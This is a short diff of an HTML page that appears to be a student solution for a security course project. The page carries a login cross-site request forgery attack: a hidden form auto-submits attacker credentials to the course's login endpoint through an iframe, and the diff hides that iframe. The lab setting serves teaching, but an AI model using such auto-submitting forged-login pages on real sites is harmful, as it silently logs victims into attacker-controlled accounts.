@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <body>
 
-<iframe name="frame" ></iframe>
+<iframe name="frame" hidden></iframe>
 <form id="myForm" action="https://project2.ecen4133.org/login" method="POST" target="frame">
   <input type="hidden" id="username" name="username" value="attacker" />
   <input type="hidden" id="userpass" name="password" value="l33th4x"  />
@@ -9,7 +9,7 @@
   <input type="hidden" name="csrfdefense" value="0" />
 </form>
 <script>
-document.getElementById('myForm').submit();
+  document.getElementById('myForm').submit();
 </script>
 </body>
 
